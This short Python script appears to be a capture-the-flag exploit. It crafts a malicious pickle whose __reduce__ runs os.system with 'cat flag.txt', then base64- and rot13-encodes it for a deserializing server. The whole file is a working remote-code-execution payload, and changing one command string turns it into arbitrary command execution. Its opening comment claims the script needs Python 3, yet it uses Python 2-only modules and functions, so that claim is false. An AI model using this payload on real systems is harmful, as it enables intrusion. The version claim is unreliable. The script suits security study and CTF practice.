#important this will only work on python3 since that's what the server used!

import cPickle 
import sys 
import base64
import string

rot13 = string.maketrans( 
    "ABCDEFGHIJKLMabcdefghijklmNOPQRSTUVWXYZnopqrstuvwxyz", 
    "NOPQRSTUVWXYZnopqrstuvwxyzABCDEFGHIJKLMabcdefghijklm")

CMD = "cat flag.txt"

 
class PickleObject(object): 
  def __reduce__(self): 
    import os 
    return (os.system,(CMD,)) 


print(string.translate(base64.b64encode(cPickle.dumps(PickleObject())),rot13))
